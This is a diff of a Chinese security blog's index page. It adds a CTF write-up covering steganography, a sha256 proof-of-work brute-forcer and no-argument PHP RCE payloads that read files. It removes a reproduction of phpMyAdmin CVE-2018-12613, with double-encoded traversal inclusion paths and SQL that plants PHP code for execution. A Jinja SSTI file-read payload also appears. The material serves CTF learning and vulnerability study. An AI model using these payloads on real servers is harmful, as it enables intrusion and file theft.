@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,106 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/08/WP/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%8B%87%E8%80%85%E8%B5%9B%E9%81%93%E9%83%A8%E5%88%86WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/05/08/WP/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%8B%87%E8%80%85%E8%B5%9B%E9%81%93%E9%83%A8%E5%88%86WP/" class="post-title-link" itemprop="url">春秋杯勇者赛道部分WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-05-08 13:39:09 / 修改时间：13:40:58" itemprop="dateCreated datePublished" datetime="2022-05-08T13:39:09+08:00">2022-05-08</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>签到</p>
+<p>关注公众号按照图片所给音调在环境里点就行了</p>
+<p>tiger</p>
+<p>下载附件得到png-key.txt，内容有ag2a`f76</p>
+<p>在tips.txt里可以得到以下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.These are rot for 47 days</span><br><span class="line">2.Have you heard that lsb steganography also requires a password?</span><br></pre></td></tr></table></figure>
+<p> 第一个很明显是rot47，第二个应该是要用lsb做一个带密码的解密<br>所以</p>
+<p>•ag2a`f76 是 rot47 加密，解密为：28a217fe</p>
+<p>•PNG 图片是 LSB 加密</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
+<p>解密可以得到where这个压缩包的解压密码：71zr9H6jnXRHn64WBxMbCzz16saCZWiw</p>
+<p>在里面看到key.zip和flag.zip中的information.txt的crc32都是一样，很明显是明文攻击，可以得到flag.zip的密码</p>
+<p>Nh6i@= </p>
+<p>用010打开flag文件，可以看到png的文件头，改后缀名得到一个二维码。</p>
+<p>用bcTester扫，然后在010里面转为hex，可以得到0宽隐写后的文本</p>
+<p>解密</p>
+<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p>
+<p>得到以下字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owl wvn n xhkm SBWav krttqbu gfq gja jhheu up yljycxjpu, vvtx R jzeh pydv usd zp lalhmk, ic brtkac ya whep&#123;866q3755-t358-5119-txnr-juw666e8099m&#125;, uroa okv!</span><br></pre></td></tr></table></figure>
+<p>很像移位后的密码，考虑是凯撒或者维吉尼亚，但我这里用凯撒批量处理后没结果，采取维吉尼亚爆破<br><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are a good CTFer because you can solve my challenge, next I will give you my secret, my secret is flag&#123;xxxxxx&#125;, have fun!</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p><strong>Train</strong></p>
+<p><strong>(不知道这道题是不是有问题，我过了验证随便输了俩一样的字符就给flag了）</strong></p>
+<p><strong>验证就是爆破sha256前四位，网上找的然后改成交互的就行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">table = string.digits + string.ascii_letters</span><br><span class="line">r = remote(&#x27;url&#x27;,port )</span><br><span class="line">def proof():</span><br><span class="line">    r.recvuntil(b&#x27;sha256(XXXX&#x27;)</span><br><span class="line">    line = r.recvline()[:-1].decode()</span><br><span class="line">    print(line)</span><br><span class="line">    tmp = line[line.find(&#x27;+&#x27;) + 1:line.find(&#x27;)&#x27;)]</span><br><span class="line">    print(tmp)</span><br><span class="line">    aim = line[line.find(&#x27;== &#x27;) + 3:]</span><br><span class="line">    print(aim)</span><br><span class="line">    for i in table:</span><br><span class="line">        for j in table:</span><br><span class="line">            for k in table:</span><br><span class="line">                for l in table:</span><br><span class="line">                    ans = i + j + k + l</span><br><span class="line">                    if hashlib.sha256((ans + tmp).encode()).hexdigest() == aim:</span><br><span class="line">                        print(ans)</span><br><span class="line">                        r.recvuntil(b&#x27;Plz Tell Me XXXX :&#x27;)</span><br><span class="line">                        r.sendline(ans.encode())</span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line">proof()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Mercy-code</p>
+<p>做的时候，一眼顶针就知道是无参数rce，但看了下禁的挺多的，就去搜了下博客，结果能搜到的全禁了！只能翻手册了，其实最重要的部分就是要构造.（点）这个环节，剩下的直接去读文件就行</p>
+<p>最后找到这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=echo(show_source(end(scandir(next(str_split(zend_version()))))));</span><br></pre></td></tr></table></figure>
+<p>zend_version()返回3.2.1，str_split分割各个字符，next返回下一个字符，第一个字符是3，下一个就是.（点),剩下的就是读文件常见操作。<br>但是赛后发现是原题，这里附上网址</p>
+<p><a target="_blank" rel="noopener" href="https://www.it610.com/article/1465459456212070400.htm">https://www.it610.com/article/1465459456212070400.htm</a></p>
+<p>Payload：echo(implode(scandir(chr(strrev(uniqid())))));</p>
+<p>Bp跑一下看看flag在哪，发现在当前目录下的一个php文件里</p>
+<p>然后 show_source(end(scandir(chr(strrev(uniqid())))));</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1642,130 +1742,6 @@
 <p>Python的切片也行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 <p><code>[::-1]</code>来进行倒置。 </p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/18/PHP/phpmyadmin%204_8_1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/18/PHP/phpmyadmin%204_8_1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">phpmyadmin 4_8_1 远程文件包含漏洞（CVE-2018-12613）复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-18 21:29:22" itemprop="dateCreated datePublished" datetime="2022-04-18T21:29:22+08:00">2022-04-18</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-04-19 12:24:19" itemprop="dateModified" datetime="2022-04-19T12:24:19+08:00">2022-04-19</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>这里做到一道ctf题是从这个CVE出发的，跟着网上大佬专门做一个CVE的复现，主要是代码审计<br>漏洞详情：<br>范围<br>phpmyadmin 4.8.0和4.8.1<br>原理<br>首先在index.php 50-63行<br>$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);</p>
-<p>// If we have a valid target, let’s load that script instead<br>if (! empty($_REQUEST[‘target’])<br>    &amp;&amp; is_string($_REQUEST[‘target’])<br>    &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>    &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>    &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>) {<br>    include $_REQUEST[‘target’];<br>    exit;<br>}<br>审计过后可以知道要想包含target的内容，必须满足五个条件<br>target不为空<br>target为字符串<br>target不以index开头<br>target不在黑名单里<br>target满足Core::checkPageValidity<br>此处代码在Core.php 443-476行<br>public static function checkPageValidity(&amp;$page, array $whitelist = [])<br>    {<br>        if (empty($whitelist)) {<br>            $whitelist = self::$goto_whitelist;<br>        }<br>        if (! isset($page) || !is_string($page)) {<br>            return false;<br>        }</p>
-<pre><code>    if (in_array($page, $whitelist)) &#123;
-        return true;
-    &#125;
-
-    $_page = mb_substr(
-        $page,
-        0,
-        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-    );
-    if (in_array($_page, $whitelist)) &#123;
-        return true;
-    &#125;
-
-    $_page = urldecode($page);
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-    );
-    if (in_array($_page, $whitelist)) &#123;
-        return true;
-    &#125;
-
-    return false;
-&#125;
-</code></pre>
-<p>如果白名单的内容没有在开始的时候没有传参进来，就会被赋值为self：：$goto_whitelist<br>public static $goto_whitelist = array(<br>        ‘db_datadict.php’,<br>        ‘db_sql.php’,<br>        ‘db_events.php’,<br>        ‘db_export.php’,<br>        ‘db_importdocsql.php’,<br>        ‘db_multi_table_query.php’,<br>        ‘db_structure.php’,<br>        ‘db_import.php’,<br>        ‘db_operations.php’,<br>        ‘db_search.php’,<br>        ‘db_routines.php’,<br>        ‘export.php’,<br>        ‘import.php’,<br>        ‘index.php’,<br>        ‘pdf_pages.php’,<br>        ‘pdf_schema.php’,<br>        ‘server_binlog.php’,<br>        ‘server_collations.php’,<br>        ‘server_databases.php’,<br>        ‘server_engines.php’,<br>        ‘server_export.php’,<br>        ‘server_import.php’,<br>        ‘server_privileges.php’,<br>        ‘server_sql.php’,<br>        ‘server_status.php’,<br>        ‘server_status_advisor.php’,<br>        ‘server_status_monitor.php’,<br>        ‘server_status_queries.php’,<br>        ‘server_status_variables.php’,<br>        ‘server_variables.php’,<br>        ‘sql.php’,<br>        ‘tbl_addfield.php’,<br>        ‘tbl_change.php’,<br>        ‘tbl_create.php’,<br>        ‘tbl_import.php’,<br>        ‘tbl_indexes.php’,<br>        ‘tbl_sql.php’,<br>        ‘tbl_export.php’,<br>        ‘tbl_operations.php’,<br>        ‘tbl_structure.php’,<br>        ‘tbl_relation.php’,<br>        ‘tbl_replace.php’,<br>        ‘tbl_row_action.php’,<br>        ‘tbl_select.php’,<br>        ‘tbl_zoom_select.php’,<br>        ‘transformation_overview.php’,<br>        ‘transformation_wrapper.php’,<br>        ‘user_password.php’,<br>);<br>其实就是一堆内置的php页面，如果page在白名单里就返回true，但是我们一般访问或者说传参的时候并不只是一个单纯的index.php(此处举例),更多的是index.php?id=1类似这种带参数的，所以带了一点判断<br>        $_page = mb_substr(<br>            $page,<br>            0,<br>            mb_strpos($page . ‘?’, ‘?’)<br>        );<br>        if (in_array($_page, $whitelist)) {<br>            return true;<br>        }</p>
-<pre><code>    $_page = urldecode($page);
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-    );
-    if (in_array($_page, $whitelist)) &#123;
-        return true;
-    &#125;
-
-    return false;
-</code></pre>
-<p>函数作用：<br>mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) : int<br>查找 string 在一个 string 中首次出现的位置。基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。<br>$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中，就返回true，而且还考虑了url编码的情况，所以如果这步判断为false，下一步就进行url解码<br>        $_page = urldecode($page);</p>
-<pre><code>    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-    );
-    if (in_array($_page, $whitelist)) &#123;
-        return true;
-    &#125;
-</code></pre>
-<p>所以传入二次编码的内容，会让checkpagevalidity()这个函数一开始是db_datadict.php%3f,又一次解码后变成db_datadict.php?,就符合了?前内容在白名单中的要求返回true，但是index.php中$_REQUEST[‘target’]仍然是db_datadict.php%3f而且会被include包含，通过目录穿越，就可以造成任意文件包含</p>
-<p>这道题就是这个cve的一种利用方式，<br>比如进行任意文件包含<br>?target=db_datadict.php%253f../../../../../../../../Windows/DATE.ini查看系统时间<br>任意代码执行：<br>比如包含数据库文件<br>在sql语句查询在数据库路径<br>show global variables like “%datadir%”;<br>向数据库写入php代码<br>create database rce;<br>use rce;<br>create table rce(code　varchar(100));<br>insert into rce(code) values(“<?php phpinfo();?>“);</p>
-<p>随后包含即可<br>?target=db_datadict.php%253f../../../../../../../MySQL/data/rce/rce.MYD</p>
 
       
     </div>
